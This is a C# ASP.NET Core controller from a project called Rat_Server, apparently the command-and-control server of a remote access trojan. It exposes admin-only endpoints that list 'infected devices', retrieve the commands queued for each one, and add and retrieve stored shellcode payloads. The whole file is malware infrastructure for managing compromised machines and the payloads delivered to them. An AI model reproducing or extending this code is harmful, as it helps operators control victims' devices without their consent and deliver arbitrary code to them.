using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Org.BouncyCastle.Utilities;
using Rat_Server.Model.DataConverter;
using Rat_Server.Model.Context;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.Entities;
using System.Net;
using Rat_Server.Migrations;

namespace Rat_Server.Controllers
{
    /// <summary>
    /// This controller contains endpoints that perform 
    /// administrative actions on the infected devices.
    /// </summary>
    [Authorize(Policy = "AdminOnly")]
    [Route("api/[controller]")]
    [ApiController]
    public class AdminController : ControllerBase
    {
        private readonly RatDbContext _context;

        public AdminController(RatDbContext context)
        {
            _context = context;
        }

        [HttpGet("GetAllInfectedDevices")]
        public async Task<ActionResult<List<Device>>> GetAllInfectedDevices()
        {
            return Ok(await _context.Devices.ToListAsync());
        }

        [HttpGet("GetDeviceCommands/{deviceId}")]
        public async Task<ActionResult<List<Command>>> GetDeviceCommands(Guid deviceId)
        {
            if (await _context.Devices.FindAsync(deviceId) == null)
            {
                return NotFound("No Device with the corresponding deviceId was found");
            }

            return Ok(await _context.Commands.Where(q => q.DevicedHwid == deviceId).ToListAsync());
        }

        [HttpPost("AddShellCode")]
        [ProducesResponseType(StatusCodes.Status201Created)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status409Conflict)]
        public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
        {
            if (!ModelState.IsValid)
            {
                return StatusCode(StatusCodes.Status400BadRequest);
            }

            if(await _context.ShellCodes.CountAsync(b => b.Name == shellCodeDto.Name) > 0)
            {
                return StatusCode(StatusCodes.Status409Conflict);
            }

            try
            {
                await _context.ShellCodes.AddAsync(new ShellCode
                {
                    Name = shellCodeDto.Name,
                    Code = shellCodeDto.Code
                });

                await _context.SaveChangesAsync();

                return StatusCode(StatusCodes.Status201Created);
            }
            catch(ArgumentException ex)
            {
                return BadRequest(ex);
            }
        }

/*        [HttpGet("DeleteShellCode/{id}")]
        [ProducesResponseType(StatusCodes.Status204NoContent)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]*/

        [HttpGet("GetAllShellCode")]
        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
        {
            List<ShellCodeDto> shellCodes = new List<ShellCodeDto>();
            
            foreach(ShellCode shellCodeEntity in await _context.ShellCodes.ToListAsync())
            {
                shellCodes.Add(new ShellCodeDto
                {
                    Name = shellCodeEntity.Name,
                    Code = shellCodeEntity.Code.ToLower()
                });
            }

            return Ok(shellCodes);
        }
    }
}
